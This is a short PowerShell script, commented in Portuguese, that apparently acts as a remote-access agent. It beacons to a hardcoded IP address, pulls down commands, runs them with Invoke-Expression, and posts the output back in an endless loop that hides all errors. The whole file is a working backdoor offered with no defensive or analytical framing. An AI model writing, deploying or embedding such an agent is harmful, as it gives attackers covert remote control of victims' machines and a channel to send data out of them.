# Agente PowerShell contínuo
$user = "lumen"
$clientId = "PS-CLIENT-" + $env:COMPUTERNAME
$serverUrl = "http://109.123.249.185:80/api/ping"
$comandoUrl = "http://109.123.249.185:80/api/get_comando"
$resultUrl = "http://109.123.249.185:80/api/command_result"

# Obter IP público
try {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10).Trim()
} catch {
    $ip = "127.0.0.1"
}

$contador = 0
while ($true) {
    $contador++
    
    try {
        # Envia ping
        $pingBody = @{
            user = $user
            client_id = $clientId
            ip = $ip
        } | ConvertTo-Json
        
        $pingResponse = Invoke-RestMethod -Uri $serverUrl -Method POST -Body $pingBody -ContentType "application/json" -TimeoutSec 10
        
        # Busca comando
        $cmdBody = @{
            user = $user
            client_id = $clientId
        } | ConvertTo-Json
        
        $cmdResponse = Invoke-RestMethod -Uri $comandoUrl -Method POST -Body $cmdBody -ContentType "application/json" -TimeoutSec 10
        
        if ($cmdResponse.comando -and $cmdResponse.comando -ne "") {
            # Executa comando
            try {
                $output = Invoke-Expression $cmdResponse.comando 2>&1 | Out-String
            } catch {
                $output = "ERRO na execução: $($_.Exception.Message)"
            }
            
            # Envia resultado
            $resultBody = @{
                user = $user
                client_id = $clientId
                result = $output
            } | ConvertTo-Json
            
            $resultResponse = Invoke-RestMethod -Uri $resultUrl -Method POST -Body $resultBody -ContentType "application/json" -TimeoutSec 10
        }

    } catch {
        # Ignora erros de conexão e continua
    }

    Start-Sleep -Seconds 15
}